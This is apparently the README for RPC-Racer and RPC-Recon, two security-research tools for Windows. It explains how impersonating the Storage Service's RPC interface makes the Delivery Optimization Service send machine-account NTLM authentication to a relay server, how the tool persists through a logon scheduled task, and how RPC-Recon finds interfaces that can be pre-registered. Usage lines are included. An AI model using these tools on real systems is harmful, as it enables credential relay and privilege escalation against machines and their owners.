## rpc-racer

This tool is used to masquerade as a legitimate, built-in RPC server of the operating system without administrator privileges.
It mimics the RPC interface of the Storage Service (StorSvc.dll) and forces the Delivery Optimization Service (dosvc.dll) to send an RPC request to it. The response sent by RPC-Racer contains a path that will be accessed by DoSvc. By specifying a network share as the path, an NTLM authentication of the machine account will be triggered. This authentication can then be relayed to leverage the privileges of the machine account.

This attack will succeed only if the Storage Service is turned off. To execute the tool before this service is launched, the parameter `/register` should be specified for RPC-Racer. It will make the tool create a scheduled task that will start when the current user logs on. After the machine reboots and the user logs on again, RPC-Racer will be executed automatically with the IP address specified upon registration.


## Usage
```
RPC-Racer.exe RELAY_SERVER_IP_ADDRESS [/register]
```

## Notes
- In cases where the Storage Service is launched before the scheduled task of RPC-Racer, the following setting should be turned on: Windows Update -> Advanced Options -> Delivery Optimization -> Allow downloads from other devices

# RPC-Recon
This tool is used to find vulnerable interfaces that can be registered by an attacker right after the system boots, before most services are launched. It queries the Endpoint Mapper for all the dynamic endpoints registered and scans the memory of processes to find well-known endpoints. Then, it waits and performs the same retrieval again to find RPC servers that are registered late. When the RPC-Recon is done, a text file will be created with all interfaces that can be registered before the original service.

To create a scheduled task that will execute RPC-Recon when the current user logs on, specify the parameter `/register`.

## Usage
```
RPC-Recon.exe [/register]
```

## Notes
- RPC-Recon needs to read the memory of elevated processes. Therefore, it should be executed with administrator privileges.